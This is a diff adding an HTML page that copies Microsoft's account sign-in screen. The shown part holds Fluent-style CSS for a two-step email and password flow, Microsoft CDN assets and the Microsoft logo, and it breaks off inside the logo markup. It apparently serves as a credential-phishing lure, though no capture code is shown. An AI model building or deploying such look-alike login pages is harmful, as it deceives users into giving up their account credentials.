@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="EN-US">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes"/>
+    <title>Sign in to your Microsoft account</title>
+    <link rel="shortcut icon" href="https://logincdn.msftauth.net/16.000.31088.5/images/favicon.ico"/>
+
+    <style>
+        /* Design Tokens based on Fluent UI - Auto-switching between Light and Dark */
+        :root {
+            /* Shared tokens */
+            --borderRadiusNone: 0;
+            --borderRadiusSmall: 2px;
+            --borderRadiusMedium: 4px;
+            --borderRadiusLarge: 6px;
+            --borderRadiusXLarge: 8px;
+            --borderRadiusCircular: 10000px;
+            --fontSizeBase100: 10px;
+            --fontSizeBase200: 12px;
+            --fontSizeBase300: 14px;
+            --fontSizeBase400: 16px;
+            --fontSizeBase500: 20px;
+            --fontSizeBase600: 24px;
+            --fontSizeHero700: 28px;
+            --fontSizeHero800: 32px;
+            --fontSizeHero900: 40px;
+            --fontSizeHero1000: 68px;
+            --lineHeightBase100: 14px;
+            --lineHeightBase200: 16px;
+            --lineHeightBase300: 20px;
+            --lineHeightBase400: 22px;
+            --lineHeightBase500: 28px;
+            --lineHeightBase600: 32px;
+            --lineHeightHero700: 36px;
+            --lineHeightHero800: 40px;
+            --lineHeightHero900: 52px;
+            --lineHeightHero1000: 92px;
+            --fontFamilyBase: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
+            --fontWeightRegular: 400;
+            --fontWeightMedium: 500;
+            --fontWeightSemibold: 600;
+            --fontWeightBold: 700;
+            --strokeWidthThin: 1px;
+            --strokeWidthThick: 2px;
+            --spacingHorizontalXXS: 2px;
+            --spacingHorizontalXS: 4px;
+            --spacingHorizontalSNudge: 6px;
+            --spacingHorizontalS: 8px;
+            --spacingHorizontalM: 12px;
+            --spacingHorizontalL: 16px;
+            --spacingHorizontalXL: 20px;
+            --spacingHorizontalXXL: 24px;
+            --spacingVerticalXXS: 2px;
+            --spacingVerticalXS: 4px;
+            --spacingVerticalS: 8px;
+            --spacingVerticalM: 12px;
+            --spacingVerticalL: 16px;
+            --spacingVerticalXL: 20px;
+            --spacingVerticalXXL: 24px;
+            --spacingVerticalXXXL: 32px;
+            --durationNormal: 200ms;
+            --curveDecelerateMid: cubic-bezier(0,0,0,1);
+
+            /* Light Theme (Default) */
+            --colorNeutralForeground1: #242424;
+            --colorNeutralForeground2: #424242;
+            --colorNeutralForeground3: #616161;
+            --colorNeutralForeground4: #707070;
+            --colorNeutralForegroundDisabled: #bdbdbd;
+            --colorBrandForegroundLink: #115ea3;
+            --colorBrandForegroundLinkHover: #0f548c;
+            --colorBrandForegroundLinkPressed: #0c3b5e;
+            --colorBrandForeground1: #0f6cbd;
+            --colorNeutralForegroundOnBrand: #ffffff;
+            --colorNeutralBackground1: #ffffff;
+            --colorNeutralBackground1Hover: #f5f5f5;
+            --colorNeutralBackground1Pressed: #e0e0e0;
+            --colorNeutralBackground2: #fafafa;
+            --colorNeutralStroke1: #d1d1d1;
+            --colorNeutralStroke1Hover: #c7c7c7;
+            --colorNeutralStrokeAccessible: #616161;
+            --colorNeutralStrokeAccessibleHover: #575757;
+            --colorNeutralStrokeAccessibleSelected: #0f6cbd;
+            --colorBrandBackground: #0f6cbd;
+            --colorBrandBackgroundHover: #115ea3;
+            --colorBrandBackgroundPressed: #0c3b5e;
+            --colorStatusDangerBackground3: #c50f1f;
+            --colorStatusSuccessBackground3: #107c10;
+            --colorStrokeFocus1: #ffffff;
+            --colorStrokeFocus2: #000000;
+            --colorNeutralShadowKey: rgba(0,0,0,0.14);
+            --colorNeutralShadowAmbient: rgba(0,0,0,0.12);
+            --shadow16: 0 0 2px var(--colorNeutralShadowAmbient), 0 8px 16px var(--colorNeutralShadowKey);
+            --signInContainerMaxWidth: 440px;
+            --signInContainerMinWidth: 320px;
+            --signInContainerBorderRadius: 12px;
+            --signInContainerPadding: 40px;
+            --signInContainerBackgroundColor: var(--colorNeutralBackground1);
+        }
+
+        /* Dark Theme - Auto-detected based on system preference */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --colorNeutralForeground1: #ffffff;
+                --colorNeutralForeground2: #d6d6d6;
+                --colorNeutralForeground3: #adadad;
+                --colorNeutralForeground4: #999999;
+                --colorNeutralForegroundDisabled: #5c5c5c;
+                --colorBrandForegroundLink: #479ef5;
+                --colorBrandForegroundLinkHover: #62abf5;
+                --colorBrandForegroundLinkPressed: #2886de;
+                --colorBrandForeground1: #479ef5;
+                --colorNeutralForegroundOnBrand: #ffffff;
+                --colorNeutralBackground1: #292929;
+                --colorNeutralBackground1Hover: #3d3d3d;
+                --colorNeutralBackground1Pressed: #1f1f1f;
+                --colorNeutralBackground2: #1f1f1f;
+                --colorNeutralStroke1: #666666;
+                --colorNeutralStroke1Hover: #757575;
+                --colorNeutralStrokeAccessible: #adadad;
+                --colorNeutralStrokeAccessibleHover: #bdbdbd;
+                --colorNeutralStrokeAccessibleSelected: #479ef5;
+                --colorBrandBackground: #115ea3;
+                --colorBrandBackgroundHover: #0f6cbd;
+                --colorBrandBackgroundPressed: #0c3b5e;
+                --colorStatusDangerBackground3: #c50f1f;
+                --colorStatusSuccessBackground3: #107c10;
+                --colorStrokeFocus1: #000000;
+                --colorStrokeFocus2: #ffffff;
+                --colorNeutralShadowKey: rgba(0,0,0,0.28);
+                --colorNeutralShadowAmbient: rgba(0,0,0,0.24);
+                --shadow16: 0 0 2px var(--colorNeutralShadowAmbient), 0 8px 16px var(--colorNeutralShadowKey);
+                --signInContainerBackgroundColor: #292929;
+            }
+        }
+
+        * {
+            margin: 0;
+            padding: 0 5px;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: var(--fontFamilyBase);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            /* Light mode background - Fluent light SVG */
+            background-image: url(https://logincdn.msftauth.net/shared/5/images/fluent_web_light_2_145a07dcb971527a82b8.svg);
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            transition: background-image 0.3s ease;
+        }
+
+        /* Dark mode background - Fluent dark SVG without gradient overlay */
+        @media (prefers-color-scheme: dark) {
+            body {
+                background-image: url(https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg);
+            }
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: var(--signInContainerMaxWidth);
+            min-width: var(--signInContainerMinWidth);
+            background: var(--signInContainerBackgroundColor);
+            border-radius: var(--signInContainerBorderRadius);
+            box-shadow: var(--shadow16);
+            padding: var(--signInContainerPadding);
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            transition: background-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        /* Top bar with back arrow and logo */
+        .top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .top-bar .back-arrow {
+            font-family: var(--fontFamilyBase);
+            font-size: var(--fontSizeBase400);
+            font-weight: var(--fontWeightRegular);
+            color: #707070;
+            text-decoration: none;
+            cursor: pointer;
+            transition: color 0.3s ease;
+            line-height: 1;
+            padding: 4px 8px 4px 0;
+            flex-shrink: 0;
+        }
+
+        .top-bar .back-arrow:hover {
+            color: #0f6cbd;
+            text-decoration: none;
+        }
+
+        .top-bar .logo {
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex: 1;
+            margin: 0;
+        }
+
+        .top-bar .logo svg {
+            width: 114px;
+            height: 24px;
+        }
+
+        /* Microsoft Logo - Light Theme */
+        .top-bar .logo .ms-logo-light {
+            display: block;
+        }
+        .top-bar .logo .ms-logo-dark {
+            display: none;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            .top-bar .logo .ms-logo-light {
+                display: none;
+            }
+            .top-bar .logo .ms-logo-dark {
+                display: block;
+            }
+        }
+
+        /* Spacer for alignment */
+        .top-bar .spacer {
+            width: 30px;
+            flex-shrink: 0;
+        }
+
+        h1 {
+            font-size: var(--fontSizeBase600);
+            font-weight: var(--fontWeightSemibold);
+            color: var(--colorNeutralForeground1);
+            margin-bottom: 10px;
+            line-height: var(--lineHeightBase600);
+            text-align: center;
+            width: 100%;
+            transition: color 0.3s ease;
+        }
+
+        .subtitle {
+            font-size: var(--fontSizeBase300);
+            color: var(--colorNeutralForeground1);
+            margin-top: 0px;
+            margin-bottom: 24px;
+            text-align: center;
+            font-weight: var(--fontWeightRegular);
+            line-height: var(--lineHeightBase300);
+            width: 100%;
+            transition: color 0.3s ease;
+        }
+
+        .subtitle a {
+            color: var(--colorBrandForegroundLink);
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .subtitle a:hover {
+            text-decoration: underline;
+            color: var(--colorBrandForegroundLinkHover);
+        }
+
+        /* Fluent UI Style Form Fields - Floating Label */
+        .fui-Field {
+            display: flex;
+            flex-direction: column;
+            gap: var(--spacingVerticalXS);
+            margin-bottom: var(--spacingVerticalL);
+            width: 100%;
+        }
+
+        .fui-Input {
+            position: relative;
+            display: flex;
+            align-items: center;
+            background: var(--colorNeutralBackground1);
+            border: var(--strokeWidthThin) solid var(--colorNeutralStroke1);
+            border-radius: var(--borderRadiusMedium);
+            transition: border-color var(--durationNormal) var(--curveDecelerateMid), background-color 0.3s ease;
+            min-height: 41px;
+            padding: 0 var(--spacingHorizontalM);
+            cursor: text;
+            width: 100%;
+        }
+
+        .fui-Input:hover {
+            border-color: var(--colorNeutralStroke1Hover);
+        }
+
+        .fui-Input:focus-within {
+            border-color: #0c3b5e;
+            box-shadow: 0 0 0 0.5px #0c3b5e;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            .fui-Input:focus-within {
+                box-shadow: 0 0 0 0.5px #0c3b5e;
+            }
+        }
+
+        .fui-Input .fui-Input__contentBefore {
+            display: flex;
+            align-items: center;
+            flex-shrink: 0;
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            transition: all var(--durationNormal) var(--curveDecelerateMid);
+            pointer-events: none;
+            padding: 0 var(--spacingHorizontalXS);
+            background: transparent;
+        }
+
+        .fui-Input .fui-Input__contentBefore label {
+            font-family: var(--fontFamilyBase);
+            font-size: var(--fontSizeBase300);
+            font-weight: var(--fontWeightRegular);
+            color: var(--colorNeutralForeground4);
+            line-height: var(--lineHeightBase300);
+            cursor: text;
+            transition: all var(--durationNormal) var(--curveDecelerateMid);
+            white-space: nowrap;
+            pointer-events: none;
+            padding: 0 1px;
+        }
+
+        /* Floating label - moves up when focused or has value */
+        .fui-Input:focus-within .fui-Input__contentBefore,
+        .fui-Input.has-value .fui-Input__contentBefore {
+            top: 0;
+            transform: translateY(-50%);
+            padding: 0 var(--spacingHorizontalXS);
+            background: var(--colorNeutralBackground1);
+            border-radius: var(--borderRadiusSmall);
+        }
+
+        .fui-Input:focus-within .fui-Input__contentBefore label,
+        .fui-Input.has-value .fui-Input__contentBefore label {
+            font-size: 11px;
+            font-weight: var(--fontWeightMedium);
+            color: #707070;
+            line-height: var(--lineHeightBase200);
+        }
+
+        .fui-Input:focus-within .fui-Input__contentBefore label {
+            color: #707070;
+        }
+
+        .fui-Input.error:focus-within .fui-Input__contentBefore label,
+        .fui-Input.error.has-value .fui-Input__contentBefore label {
+            color: var(--colorStatusDangerBackground3);
+        }
+
+        .fui-Input__input {
+            flex: 1;
+            border: none;
+            outline: none;
+            background: transparent;
+            font-family: var(--fontFamilyBase);
+            font-size: 16px;
+            font-weight: var(--fontWeightRegular);
+            color: var(--colorNeutralForeground1);
+            padding: 0px 0px 0px 4px;
+            min-height: 31px;
+            width: 100%;
+            line-height: var(--lineHeightBase300);
+            transition: color 0.3s ease;
+            margin-top: 6px;
+        }
+
+        .fui-Input__input::placeholder {
+            font-family: var(--fontFamilyBase);
+            font-size: var(--fontSizeBase300);
+            font-weight: var(--fontWeightRegular);
+            color: var(--colorNeutralForegroundDisabled);
+            opacity: 0;
+            transition: opacity var(--durationNormal) var(--curveDecelerateMid), color 0.3s ease;
+            line-height: var(--lineHeightBase300);
+        }
+
+        .fui-Input:focus-within .fui-Input__input::placeholder,
+        .fui-Input.has-value .fui-Input__input::placeholder {
+            opacity: 1;
+        }
+
+        .fui-Input__input:focus {
+            outline: none;
+        }
+
+        .fui-Input__input:-webkit-autofill {
+            -webkit-box-shadow: 0 0 0 1000px var(--colorNeutralBackground1) inset !important;
+            -webkit-text-fill-color: var(--colorNeutralForeground1) !important;
+        }
+
+        .fui-Field__validationMessage {
+            font-family: var(--fontFamilyBase);
+            font-size: var(--fontSizeBase200);
+            font-weight: var(--fontWeightRegular);
+            color: var(--colorStatusDangerBackground3);
+            line-height: var(--lineHeightBase200);
+            min-height: 16px;
+            padding-top: var(--spacingVerticalXXS);
+            transition: color 0.3s ease;
+        }
+
+        .fui-Field__validationMessage.success {
+            color: var(--colorStatusSuccessBackground3);
+        }
+
+        /* Error state */
+        .fui-Input.error {
+            border-color: var(--colorStatusDangerBackground3);
+        }
+
+        .fui-Input.error:focus-within {
+            border-color: var(--colorStatusDangerBackground3);
+            box-shadow: 0 0 0 2px rgba(197, 15, 31, 0.2);
+        }
+
+        .fui-Input.error .fui-Input__contentBefore label {
+            color: var(--colorStatusDangerBackground3);
+        }
+
+        .sign-in-options {
+            margin: var(--spacingVerticalM) 0 var(--spacingVerticalXL);
+            width: 100%;
+        }
+
+        .sign-in-options a {
+            font-family: var(--fontFamilyBase);
+            font-size: var(--fontSizeBase300);
+            font-weight: 600;
+            color: var(--colorBrandForegroundLink);
+            text-decoration: none;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+
+        .sign-in-options a:hover {
+            text-decoration: underline;
+            color: var(--colorBrandForegroundLinkHover);
+        }
+
+        .sign-in-btn {
+            width: 100%;
+            padding: var(--spacingVerticalS) var(--spacingHorizontalL);
+            font-family: var(--fontFamilyBase);
+            font-size: var(--fontSizeBase300);
+            font-weight: var(--fontWeightSemibold);
+            color: var(--colorNeutralForegroundOnBrand);
+            background: var(--colorBrandBackground);
+            border: none;
+            border-radius: var(--borderRadiusMedium);
+            cursor: pointer;
+            transition: background var(--durationNormal) var(--curveDecelerateMid), color 0.3s ease;
+            line-height: var(--lineHeightBase300);
+            min-height: 40px;
+        }
+
+        .sign-in-btn:hover {
+            background: var(--colorBrandBackgroundHover);
+        }
+
+        .sign-in-btn:active {
+            background: var(--colorBrandBackgroundPressed);
+        }
+
+        .sign-in-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .create-account {
+            text-align: center;
+            font-family: var(--fontFamilyBase);
+            font-size: var(--fontSizeBase300);
+            font-weight: var(--fontWeightRegular);
+            color: var(--colorNeutralForeground1);
+            margin-top: 24px;
+            line-height: var(--lineHeightBase300);
+            width: 100%;
+            transition: color 0.3s ease;
+        }
+
+        .create-account a {
+            color: var(--colorBrandForegroundLink);
+            text-decoration: none;
+            font-weight: var(--fontWeightSemibold);
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+
+        .create-account a:hover {
+            text-decoration: underline;
+            color: var(--colorBrandForegroundLinkHover);
+        }
+
+        .create-account .normal-text {
+            color: var(--colorNeutralForeground1);
+            font-weight: var(--fontWeightRegular);
+            transition: color 0.3s ease;
+        }
+
+        .error-message {
+            font-family: var(--fontFamilyBase);
+            font-size: var(--fontSizeBase200);
+            font-weight: var(--fontWeightRegular);
+            color: var(--colorStatusDangerBackground3);
+            line-height: var(--lineHeightBase200);
+            margin-top: var(--spacingVerticalXXS);
+            display: none;
+            transition: color 0.3s ease;
+        }
+
+        .error-message.visible {
+            display: block;
+        }
+
+        .success-message {
+            font-family: var(--fontFamilyBase);
+            font-size: var(--fontSizeBase200);
+            font-weight: var(--fontWeightRegular);
+            color: var(--colorStatusSuccessBackground3);
+            line-height: var(--lineHeightBase200);
+            margin-top: var(--spacingVerticalXXS);
+            display: none;
+            transition: color 0.3s ease;
+        }
+
+        .success-message.visible {
+            display: block;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid var(--colorNeutralForegroundOnBrand);
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: var(--spacingHorizontalXS);
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Page 2 - Email Display with 60px margins */
+        .email-display {
+            display: relative;
+            align-items: center;
+            margin: 0 60px var(--spacingVerticalXXL) 60px;
+            padding: 6px 2px;
+            border: var(--strokeWidthThin) solid #616161;
+            border-radius: var(--borderRadiusCircular);
+            font-family: var(--fontFamilyBase);
+            font-size: var(--fontSizeBase300);
+            font-weight: var(--fontWeightSemibold);
+            color: var(--colorNeutralForeground1);
+            background: #ffffff;
+            max-width: calc(100% - 120px);
+            word-break: break-all;
+            text-align: center;
+            line-height: var(--lineHeightBase300);
+            transition: border-color 0.3s ease, background-color 0.3s ease, color 0.3s ease;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .email-display .email-text {
+            font-weight: var(--fontWeightSemibold);
+            color: #616161;
+            transition: color 0.3s ease;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 100%;
+        }
+
+        /* Page 2 - Enter your password title below email */
+        .password-title {
+            font-size: var(--fontSizeBase600);
+            font-weight: var(--fontWeightSemibold);
+            color: var(--colorNeutralForeground1);
+            margin-bottom: 15px;
+            line-height: var(--lineHeightBase600);
+            text-align: center;
+            width: 100%;
+            transition: color 0.3s ease;
+        }
+
+        .password-subtitle {
+            font-size: var(--fontSizeBase300);
+            color: var(--colorNeutralForeground1);
+            margin-top: 0px;
+            margin-bottom: 24px;
+            text-align: center;
+            font-weight: var(--fontWeightRegular);
+            line-height: var(--lineHeightBase300);
+            width: 100%;
+            transition: color 0.3s ease;
+        }
+
+        .page {
+            display: none;
+            width: 100%;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        /* Hide back arrow on page 1 */
+        .page1 .back-arrow {
+            display: none;
+        }
+
+        /* Show back arrow on page 2 */
+        .page2 .back-arrow {
+            display: block;
+        }
+
+        /* Hidden field for email in password form */
+        .hidden-email-field {
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+            }
+
+            .login-container {
+                padding: 24px 20px 32px;
+                margin: 10px;
+                border-radius: var(--borderRadiusLarge);
+                max-width: 100%;
+                min-width: 0;
+            }
+
+            .password-title {
+                font-size: var(--fontSizeBase500);
+            }
+
+            .email-display {
+                font-size: var(--fontSizeBase300);
+                padding: var(--spacingVerticalS) var(--spacingHorizontalL);
+                margin: 0 20px var(--spacingVerticalXXL) 20px;
+                max-width: calc(100% - 40px);
+                white-space: normal;
+                word-break: break-all;
+            }
+
+            .fui-Input {
+                min-height: 44px;
+                padding: 0 var(--spacingHorizontalS);
+            }
+
+            .fui-Input__input {
+                font-size: var(--fontSizeBase300);
+                min-height: 44px;
+                padding: var(--spacingVerticalM) 0 var(--spacingVerticalXS) 0;
+            }
+
+            .fui-Input:focus-within .fui-Input__contentBefore label,
+            .fui-Input.has-value .fui-Input__contentBefore label {
+                font-size: 10px;
+            }
+
+            .top-bar .back-arrow {
+                font-size: var(--fontSizeBase400);
+                padding: 2px 6px 2px 0;
+            }
+
+            .top-bar .spacer {
+                width: 20px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .email-display {
+                margin: 0 12px var(--spacingVerticalXXL) 12px;
+                max-width: calc(100% - 24px);
+                font-size: var(--fontSizeBase200);
+                padding: var(--spacingVerticalS) var(--spacingHorizontalM);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Top Bar with Back Arrow and Logo -->
+        <div class="top-bar">
+            <!-- Back Arrow - visible only on page 2 -->
+            <a href="#" class="back-arrow" id="backArrow">←</a>
+
+            <!-- Logo - centered -->
+            <div class="logo">
+                <!-- Light Theme Logo -->
+                <svg class="ms-logo-light" viewBox="0 0 114 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M47.2997 5.30006V19.7001H44.7997V8.40006H44.7664L40.2997 19.7001H38.633L34.0664 8.40006H34.033V19.7001H31.733V5.30006H35.333L39.4664 15.9667H39.533L43.8997 5.30006H47.2997ZM49.3664 6.40006C49.3664 6.00006 49.4997 5.66673 49.7997 5.40006C50.0997 5.1334 50.433 5.00006 50.833 5.00006C51.2664 5.00006 51.633 5.1334 51.8997 5.4334C52.1664 5.70006 52.333 6.0334 52.333 6.4334C52.333 6.8334 52.1997 7.16673 51.8997 7.4334C51.5997 7.70006 51.2664 7.8334 50.833 7.8334C50.3997 7.8334 50.0664 7.70006 49.7997 7.4334C49.533 7.10006 49.3664 6.76673 49.3664 6.40006ZM52.0664 9.36673V19.7001H49.633V9.36673H52.0664ZM59.433 17.9334C59.7997 17.9334 60.1997 17.8334 60.633 17.6667C61.0664 17.5001 61.4664 17.2667 61.833 17.0001V19.2667C61.433 19.5001 60.9997 19.6667 60.4997 19.7667C59.9997 19.8667 59.4664 19.9334 58.8664 19.9334C57.333 19.9334 56.0997 19.4667 55.1664 18.5001C54.1997 17.5334 53.733 16.3001 53.733 14.8334C53.733 13.1667 54.233 11.8001 55.1997 10.7334C56.1664 9.66673 57.533 9.1334 59.333 9.1334C59.7997 9.1334 60.233 9.20006 60.6997 9.30006C61.1664 9.4334 61.533 9.56673 61.7997 9.70006V12.0334C61.433 11.7667 61.033 11.5334 60.6664 11.4001C60.2664 11.2334 59.8664 11.1667 59.4664 11.1667C58.4997 11.1667 57.733 11.4667 57.133 12.1001C56.533 12.7334 56.233 13.5667 56.233 14.6334C56.233 15.6667 56.4997 16.5001 57.0664 17.0667C57.6997 17.6334 58.4664 17.9334 59.433 17.9334ZM68.733 9.20006C68.933 9.20006 69.0997 9.20006 69.2664 9.2334C69.433 9.26673 69.5664 9.30006 69.6664 9.3334V11.8001C69.533 11.7001 69.3664 11.6334 69.0997 11.5334C68.8664 11.4334 68.5664 11.4001 68.1997 11.4001C67.5997 11.4001 67.0997 11.6667 66.6997 12.1667C66.2997 12.6667 66.0664 13.4334 66.0664 14.5001V19.7001H63.633V9.36673H66.0664V11.0001H66.0997C66.333 10.4334 66.6664 10.0001 67.0997 9.66673C67.5664 9.36673 68.0997 9.20006 68.733 9.20006ZM69.7997 14.7001C69.7997 13.0001 70.2664 11.6334 71.233 10.6334C72.1997 9.6334 73.533 9.1334 75.2664 9.1334C76.8664 9.1334 78.133 9.60006 79.033 10.5667C79.933 11.5334 80.3997 12.8334 80.3997 14.4667C80.3997 16.1334 79.933 17.4667 78.9664 18.4667C77.9997 19.4667 76.6997 19.9667 75.033 19.9667C73.433 19.9667 72.1664 19.5001 71.233 18.5667C70.2664 17.6001 69.7997 16.3001 69.7997 14.7001ZM72.333 14.6001C72.333 15.6667 72.5664 16.5001 73.0664 17.0667C73.5664 17.6334 74.2664 17.9334 75.1664 17.9334C76.0664 17.9334 76.733 17.6334 77.1997 17.0667C77.6664 16.5001 77.8997 15.6667 77.8997 14.5334C77.8997 13.4334 77.6664 12.6001 77.1664 12.0334C76.6997 11.4667 76.033 11.2001 75.1664 11.2001C74.2664 11.2001 73.5997 11.5001 73.0997 12.1001C72.5664 12.6667 72.333 13.5001 72.333 14.6001ZM83.9997 12.1001C83.9997 12.4334 84.0997 12.7334 84.333 12.9334C84.5664 13.1334 85.033 13.3667 85.7997 13.6667C86.7664 14.0667 87.4664 14.5001 87.833 14.9667C88.233 15.4667 88.433 16.0334 88.433 16.7334C88.433 17.7001 88.0664 18.5001 87.2997 19.0667C86.5664 19.6667 85.533 19.9667 84.2664 19.9667C83.833 19.9667 83.3664 19.9001 82.833 19.8001C82.2997 19.7001 81.8664 19.5667 81.4997 19.4001V17.0001C81.933 17.3001 82.433 17.5667 82.933 17.7334C83.433 17.9001 83.8997 18.0001 84.333 18.0001C84.8664 18.0001 85.2997 17.9334 85.533 17.7667C85.7997 17.6001 85.933 17.3667 85.933 17.0001C85.933 16.6667 85.7997 16.3667 85.533 16.1667C85.2664 15.9334 84.733 15.6667 83.9997 15.3667C83.0997 15.0001 82.4664 14.5667 82.0997 14.1001C81.733 13.6334 81.533 13.0334 81.533 12.3001C81.533 11.3667 81.8997 10.6001 82.633 10.0001C83.3664 9.40006 84.333 9.10006 85.4997 9.10006C85.8664 9.10006 86.2664 9.1334 86.6997 9.2334C87.133 9.30006 87.533 9.4334 87.833 9.5334V11.8334C87.4997 11.6334 87.133 11.4334 86.6997 11.2667C86.2664 11.1001 85.833 11.0334 85.433 11.0334C84.9664 11.0334 84.5997 11.1334 84.3664 11.3001C84.133 11.5334 83.9997 11.7667 83.9997 12.1001ZM89.4664 14.7001C89.4664 13.0001 89.933 11.6334 90.8997 10.6334C91.8664 9.6334 93.1997 9.1334 94.933 9.1334C96.533 9.1334 97.7997 9.60006 98.6997 10.5667C99.5997 11.5334 100.066 12.8334 100.066 14.4667C100.066 16.1334 99.5997 17.4667 98.633 18.4667C97.6664 19.4667 96.3664 19.9667 94.6997 19.9667C93.0997 19.9667 91.833 19.5001 90.8997 18.5667C89.9664 17.6001 89.4664 16.3001 89.4664 14.7001ZM91.9997 14.6001C91.9997 15.6667 92.233 16.5001 92.733 17.0667C93.233 17.6334 93.933 17.9334 94.833 17.9334C95.733 17.9334 96.3997 17.6334 96.8664 17.0667C97.333 16.5001 97.5664 15.6667 97.5664 14.5334C97.5664 13.4334 97.333 12.6001 96.833 12.0334C96.3664 11.4667 95.6997 11.2001 94.833 11.2001C93.933 11.2001 93.2664 11.5001 92.7664 12.1001C92.2664 12.6667 91.9997 13.5001 91.9997 14.6001ZM108.133 11.3667H104.5V19.7001H102.033V11.3667H100.3V9.36673H102.033V7.9334C102.033 6.8334 102.4 5.96673 103.1 5.26673C103.8 4.56673 104.7 4.2334 105.8 4.2334C106.1 4.2334 106.366 4.2334 106.6 4.26673C106.833 4.30007 107.033 4.3334 107.2 4.40007V6.50006C107.133 6.46673 106.966 6.40006 106.766 6.3334C106.566 6.26673 106.333 6.2334 106.066 6.2334C105.566 6.2334 105.166 6.40006 104.9 6.70006C104.633 7.0334 104.5 7.50006 104.5 8.10006V9.3334H108.133V7.00006L110.566 6.26673V9.3334H113.033V11.3334H110.566V16.1667C110.566 16.8001 110.666 17.2667 110.9 17.5001C111.133 17.7667 111.5 17.9001 112 17.9001C112.133 17.9001 112.3 17.8667 112.5 17.8001C112.7 17.7334 112.866 17.6667 113.033 17.5667V19.5667C112.866 19.6667 112.633 19.7334 112.266 19.8001C111.9 19.8667 111.566 19.9001 111.2 19.9001C110.166 19.9001 109.4 19.6334 108.9 19.0667C108.4 18.5334 108.133 17.7001 108.133 16.6001V11.3667Z" fill="#242424"/>
+                    <path d="M13.2383 13.2383H24.5V24.5H13.2383V13.2383Z" fill="#FFB900"/>
+                    <path d="M0.5 13.2383H11.7617V24.5H0.5V13.2383Z" fill="#00A4EF"/>
+                    <path d="M13.2383 0.5H24.5V11.7617H13.2383V0.5Z" fill="#7FBA00"/>
+                    <path d="M0.5 0.5H11.7617V11.7617H0.5V0.5Z" fill="#F25022"/>
+                </svg>
+
+                <!-- Dark Theme Logo -->
+                <svg class="ms-logo-dark" viewBox="0 0 114 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M47.2997 5.30006V19.7001H44.7997V8.40006H44.7664L40.2997 19.7001H38.633L34.0664 8.40006H34.033V19.7001H31.733V5.30006H35.333L39.4664 15.9667H39.533L43.8997 5.30006H47.2997ZM49.3664 6.40006C49.3664 6.00006 49.4997 5.66673 49.7997 5.40006C50.0997 5.1334 50.433 5.00006 50.833 5.00006C51.2664 5.00006 51.633 5.1334 51.8997 5.4334C52.1664 5.70006 52.333 6.0334 52.333 6.4334C52.333 6.8334 52.1997 7.16673 51.8997 7.4334C51.5997 7.70006 51.2664 7.8334 50.833 7.8334C50.3997 7.8334 50.0664 7.70006 49.7997 7.4334C49.533 7.10006 49.3664 6.76673 49.3664 6.40006ZM52.0664 9.36673V19.7001H49.633V9.36673H52.0664ZM59.433 17.9334C59.7997 17.9334 60.1997 17.8334 60.633 17.6667C61.0664 17.5001 61.4664 17.2667 61.833 17.0001V19.2667C61.433 19.5001 60.9997 19.6667 60.4997 19.7667C59.9997 19.8667 59.4664 19.9334 58.8664 19.9334C57.333 19.9334 56.0997 19.4667 55.1664 18.5001C54.1997 17.5334 53.733 16.3001 53.733 14.8334C53.733 13.1667 54.233 11.8001 55.1997 10.7334C56.1664 9.66673 57.533 9.1334 59.333 9.1334C59.7997 9.1334 60.233 9.20006 60.6997 9.30006C61.1664 9.4334 61.533 9.56673 61.7997 9.70006V12.0334C61.433 11.7667 61.033 11.5334 60.6664 11.4001C60.2664 11.2334 59.8664 11.1667 59.4664 11.1667C58.4997 11.1667 57.733 11.4667 57.133 12.1001C56.533 12.7334 56.233 13.5667 56.233 14.6334C56.233 15.6667 56.4997 16.5001 57.0664 17.0667C57.6997 17.6334 58.4664 17.9334 59.433 17.9334ZM68.733 9.20006C68.933 9.20006 69.0997 9.20006 69.2664 9.2334C69.433 9.26673 69.5664 9.30006 69.6664 9.3334V11.8001C69.533 11.7001 69.3664 11.6334 69.0997 11.5334C68.8664 11.4334 68.5664 11.4001 68.1997 11.4001C67.5997 11.4001 67.0997 11.6667 66.6997 12.1667C66.2997 12.6667 66.0664 13.4334 66.0664 